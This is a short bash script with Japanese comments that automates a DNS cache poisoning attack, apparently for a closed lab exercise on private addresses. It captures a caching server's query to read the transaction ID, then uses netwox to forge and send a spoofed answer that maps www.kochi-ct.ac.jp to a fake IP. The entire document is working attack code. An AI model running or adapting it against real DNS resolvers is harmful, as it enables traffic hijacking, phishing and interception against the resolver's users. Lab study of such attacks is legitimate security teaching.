#!/bin/bash
# auto_dns_spoof.sh
# DNSキャッシュ汚染実験用（自動でTXID取得して偽応答送信）
# 注意: 閉じたラボ環境専用

# ==== 設定 ====
CACHE_DNS="192.168.56.102"   # キャッシュDNSサーバ
AUTH_DNS="192.168.56.103"    # 権威DNSサーバ（偽装送信元IP）
FAKE_IP="192.168.56.104"     # 偽Aレコード
DOMAIN="www.kochi-ct.ac.jp"  # 攻撃対象ドメイン
TTL="300"                     # キャッシュTTL
TMP_BIN="/tmp/dns_response.bin"

# ==== DNS問い合わせパケットを監視してTXID取得 ====
echo "[*] キャッシュサーバからのDNS問い合わせを監視..."
TXID=$(sudo tcpdump -l -n -i any "udp and src $CACHE_DNS and dst port 53" -c 1 \
      | awk '{match($0,/0x[0-9a-fA-F]{4}/,a); print a[0]}')

if [ -z "$TXID" ]; then
    echo "[!] TXIDを取得できませんでした"
    exit 1
fi

echo "[*] 取得したTXID: $TXID"

# ==== DNSレスポンス作成 ====
echo "[*] DNSレスポンスパケットを作成中..."
sudo netwox 28 \
  -t 1 \
  -d $DOMAIN \
  -i $TXID \
  -r $FAKE_IP \
  -a $TTL \
  -f 1 > $TMP_BIN

if [ $? -ne 0 ]; then
    echo "[!] DNSパケット作成に失敗しました"
    exit 1
fi

# ==== 偽応答送信 ====
echo "[*] 偽DNS応答をキャッシュサーバに送信..."
sudo netwox 105 \
  -d $CACHE_DNS \
  -D 53 \
  -s $AUTH_DNS \
  -S 53 \
  -u @$TMP_BIN

if [ $? -ne 0 ]; then
    echo "[!] 偽応答送信に失敗しました"
    exit 1
fi

echo "[*] 偽応答送信完了。キャッシュサーバのキャッシュを確認してください。"
